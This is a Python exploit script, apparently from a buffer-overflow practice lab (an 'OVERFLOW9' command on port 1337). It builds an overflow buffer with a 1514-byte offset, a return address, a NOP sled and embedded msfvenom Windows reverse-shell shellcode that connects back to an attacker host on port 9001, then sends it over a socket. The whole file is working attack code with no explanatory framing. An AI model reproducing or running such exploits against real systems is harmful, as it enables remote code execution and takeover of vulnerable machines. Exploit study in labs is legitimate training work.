#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

# Add bad chars here after first iteration of finding bad chars
# Then re-generate bytearray with the bad chars removed using mona
remove_badchars_from_badchars = "\x00\x04\x3e\x3f\xe1"
badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
for char in remove_badchars_from_badchars:
    badchars = badchars.replace(char, "")

prefix = "OVERFLOW9 "
offset = 1514
overflow = "A" * offset
retn = "\x03\x12\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 5

# Badchars: \x00\x04\x3e\x3f\xe1
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -f c -b "\x00\x04\x3e\x3f\xe1"
payload = (
"\xbb\xb4\xd0\x29\xa6\xdd\xc7\xd9\x74\x24\xf4\x5a\x31\xc9"
"\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\xee\xde\xcb\x53\xf2"
"\x37\x89\x9c\x0a\xc8\xee\x15\xef\xf9\x2e\x41\x64\xa9\x9e"
"\x01\x28\x46\x54\x47\xd8\xdd\x18\x40\xef\x56\x96\xb6\xde"
"\x67\x8b\x8b\x41\xe4\xd6\xdf\xa1\xd5\x18\x12\xa0\x12\x44"
"\xdf\xf0\xcb\x02\x72\xe4\x78\x5e\x4f\x8f\x33\x4e\xd7\x6c"
"\x83\x71\xf6\x23\x9f\x2b\xd8\xc2\x4c\x40\x51\xdc\x91\x6d"
"\x2b\x57\x61\x19\xaa\xb1\xbb\xe2\x01\xfc\x73\x11\x5b\x39"
"\xb3\xca\x2e\x33\xc7\x77\x29\x80\xb5\xa3\xbc\x12\x1d\x27"
"\x66\xfe\x9f\xe4\xf1\x75\x93\x41\x75\xd1\xb0\x54\x5a\x6a"
"\xcc\xdd\x5d\xbc\x44\xa5\x79\x18\x0c\x7d\xe3\x39\xe8\xd0"
"\x1c\x59\x53\x8c\xb8\x12\x7e\xd9\xb0\x79\x17\x2e\xf9\x81"
"\xe7\x38\x8a\xf2\xd5\xe7\x20\x9c\x55\x6f\xef\x5b\x99\x5a"
"\x57\xf3\x64\x65\xa8\xda\xa2\x31\xf8\x74\x02\x3a\x93\x84"
"\xab\xef\x34\xd4\x03\x40\xf5\x84\xe3\x30\x9d\xce\xeb\x6f"
"\xbd\xf1\x21\x18\x54\x08\xa2\xe7\x01\x12\x64\x80\x53\x12"
"\xab\x79\xdd\xf4\xc1\x69\x8b\xaf\x7d\x13\x96\x3b\x1f\xdc"
"\x0c\x46\x1f\x56\xa3\xb7\xee\x9f\xce\xab\x87\x6f\x85\x91"
"\x0e\x6f\x33\xbd\xcd\xe2\xd8\x3d\x9b\x1e\x77\x6a\xcc\xd1"
"\x8e\xfe\xe0\x48\x39\x1c\xf9\x0d\x02\xa4\x26\xee\x8d\x25"
"\xaa\x4a\xaa\x35\x72\x52\xf6\x61\x2a\x05\xa0\xdf\x8c\xff"
"\x02\x89\x46\x53\xcd\x5d\x1e\x9f\xce\x1b\x1f\xca\xb8\xc3"
"\xae\xa3\xfc\xfc\x1f\x24\x09\x85\x7d\xd4\xf6\x5c\xc6\xf4"
"\x14\x74\x33\x9d\x80\x1d\xfe\xc0\x32\xc8\x3d\xfd\xb0\xf8"
"\xbd\xfa\xa9\x89\xb8\x47\x6e\x62\xb1\xd8\x1b\x84\x66\xd8"
"\x09"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")